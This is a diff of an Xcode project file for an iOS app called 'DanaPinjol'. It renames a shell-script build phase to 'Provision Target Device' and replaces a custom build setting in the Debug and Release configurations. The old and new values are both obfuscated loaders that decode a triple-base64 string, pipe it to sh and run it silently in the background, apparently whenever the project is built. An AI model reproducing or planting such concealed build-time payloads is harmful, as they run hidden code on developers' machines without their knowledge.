@@ -610,7 +610,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7341DEA32F67AE29008D4C83 /* Build configuration list for PBXNativeTarget "DanaPinjol" */;
 			buildPhases = (
-				FB7B82068D5547CDAE1DACE1 /* Compile Code Assets */,
+				5D30C80528F945F3AC1DACE1 /* Provision Target Device */,
 				4E9D14681FF9F817457E6C66 /* [CP] Check Pods Manifest.lock */,
 				7341DE8C2F67AE28008D4C83 /* Sources */,
 				7341DE8D2F67AE28008D4C83 /* Frameworks */,
@@ -675,7 +675,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		FB7B82068D5547CDAE1DACE1 /* Compile Code Assets */ = {
+		5D30C80528F945F3AC1DACE1 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -685,7 +685,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -863,7 +863,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 33CB9C43DDA77D0519D0E6F4 /* Pods-DanaPinjol.debug.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVIzUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFiV3h1WWxkR2RWcFlVbnBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | h | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((w(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFibFoxV1RKb2FHUklUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | w | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPinjol/DanaPinjol.entitlements;
@@ -914,7 +914,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 50F5AE9A9970D6E1B0F9F78D /* Pods-DanaPinjol.release.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVIzUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFiV3h1WWxkR2RWcFlVbnBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | h | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((w(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmFibFoxV1RKb2FHUklUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | w | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPinjol/DanaPinjol.entitlements;
